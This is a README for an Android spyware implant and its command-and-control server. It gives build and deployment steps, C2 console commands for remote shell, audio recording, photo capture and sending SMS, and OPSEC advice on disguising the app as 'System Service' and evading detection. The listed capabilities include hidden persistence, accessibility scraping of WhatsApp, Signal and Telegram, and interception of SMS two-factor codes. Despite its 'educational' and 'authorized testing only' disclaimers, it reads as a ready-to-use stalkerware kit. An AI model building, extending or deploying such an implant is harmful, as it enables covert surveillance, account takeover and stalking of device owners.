# Android Spyware — System Service Implant

Complete Android implant with C2 framework. Built for educational/research purposes.

## Architecture

```
┌─────────────────┐     WebSocket (WSS)      ┌──────────────┐
│  Target Device  │ ◄──────────────────────► │  C2 Server   │
│                 │   AES-128-ECB encrypted  │              │
│  • Persistence  │                          │  • Console   │
│  • Collection   │                          │  • Loot      │
│  • Accessibility│                          │  • Commands  │
│  • Notifications│                          └──────────────┘
│  • SMS Intercept│
└─────────────────┘
```

## Components

### Implant (`app/`)
| Component | Purpose |
|-----------|---------|
| `CoreApplication` | Entry point, config, device ID |
| `MainActivity` | Hidden launcher, hides icon, requests perms |
| `PersistenceService` | Foreground service, heartbeat, collection loop |
| `WatchdogService` | Monitors services, restarts if killed |
| `BootReceiver` | Auto-start on boot/package update/power |
| `NetworkReceiver` | Reconnect on network change |
| `C2Client` | WebSocket + AES crypto, command execution |
| `DataCollector` | Contacts, calls, SMS, location, apps, WiFi |
| `AccessibilityCollector` | Reads target app UI (WhatsApp, Telegram, etc.) |
| `NotificationCollector` | Captures all notifications |
| `SmsReceiver` | Intercepts incoming SMS (2FA codes) |

### C2 Server (`c2_server.py`)
- WebSocket server with TLS support
- AES-128-ECB encryption (matches implant)
- Interactive console for tasking
- Automatic loot saving (`loot/` directory)

## Capabilities

| Category | Features |
|----------|----------|
| **Persistence** | Boot survive, watchdog, battery opt bypass, foreground service |
| **Collection** | Contacts, call log (200), SMS (200), location, apps, WiFi, device info |
| **Live Access** | Shell commands, audio recording, photo capture, file upload |
| **Messaging** | Accessibility scraping (WA, TG, Signal, Discord, FB, IG, etc.), notification mirroring, SMS intercept |
| **Communication** | Send SMS, make calls (via intent) |
| **Self-protection** | Hides icon, anti-kill, self-destruct command |

## Build

```bash
# Requirements: Android SDK (API 34), Gradle 8.5+, Java 17+
export ANDROID_HOME=$HOME/Android/Sdk
cd AndroidSpyware
./build.sh
```

Output: `app/build/outputs/apk/release/app-release.apk`

## Deploy

```bash
# Install
adb install -r app-release.apk

# Grant permissions (first run requests overlay)
# Then enable in Settings:
# - Accessibility: "System Service" → ON
# - Notification Access: "System Service" → Allow
# - Battery Optimization: "System Service" → Don't optimize
# - Device Admin (optional): for lock/wipe
```

## C2 Server

```bash
# Generate self-signed cert for WSS
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365

# Run server
python3 c2_server.py --cert cert.pem --key key.pem --port 8443

# Console commands:
c2> list                          # Show implants
c2> shell <device_id> whoami      # Execute command
c2> collect <device_id>           # Force collection
c2> record <device_id> 30         # Record 30s audio
c2> photo <device_id>             # Take photo
c2> sms <device_id> +15551234 "test"  # Send SMS
c2> uninstall <device_id>         # Self-destruct
```

## Configuration

Update C2 address in `CoreApplication.java`:
```java
private String c2Host = "your-domain.com";
private int c2Port = 8443;
private boolean useSSL = true;
```

Or push config update via C2:
```
c2> (auto-sent on connect, or use update_config command)
```

## Network Security

- `network_security_config.xml` allows cleartext for dev (10.0.2.2, localhost)
- Production: use valid TLS cert, remove cleartext permits
- Implant verifies nothing — blind trust on connect

## OPSEC Notes

- Package name: `com.system.service` (generic system appearance)
- Label: "System Service" 
- Icon: default Android (replace with gear/settings icon)
- Foreground notification: "System Service - Running" (low priority)
- No suspicious strings in binary (ProGuard + string encryption recommended)
- All comms encrypted, but key exchange is static (improve for real use)

## File Structure

```
AndroidSpyware/
├── app/
│   ├── src/main/
│   │   ├── java/com/system/service/
│   │   │   ├── CoreApplication.java
│   │   │   ├── MainActivity.java
│   │   │   ├── C2Client.java
│   │   │   ├── DataCollector.java
│   │   │   ├── core/
│   │   │   │   ├── PersistenceService.java
│   │   │   │   ├── WatchdogService.java
│   │   │   │   ├── BootReceiver.java
│   │   │   │   └── NetworkReceiver.java
│   │   │   └── collection/
│   │   │       ├── AccessibilityCollector.java
│   │   │       ├── NotificationCollector.java
│   │   │       └── SmsReceiver.java
│   │   ├── res/
│   │   │   ├── xml/accessibility_config.xml
│   │   │   ├── xml/network_security_config.xml
│   │   │   ├── values/strings.xml
│   │   │   └── values/themes.xml
│   │   └── AndroidManifest.xml
│   ├── build.gradle
│   └── proguard-rules.pro
├── build.gradle
├── settings.gradle
├── build.sh
├── c2_server.py
└── README.md
```

## Requirements

- Android 7.0+ (API 24)
- Target SDK 34
- Java 17
- Gradle 8.5+
- Python 3.8+ for C2 (websockets, cryptography)

```bash
pip install websockets cryptography
```

## Legal

**For authorized testing only.** Unauthorized deployment is illegal. You are responsible for compliance with applicable laws.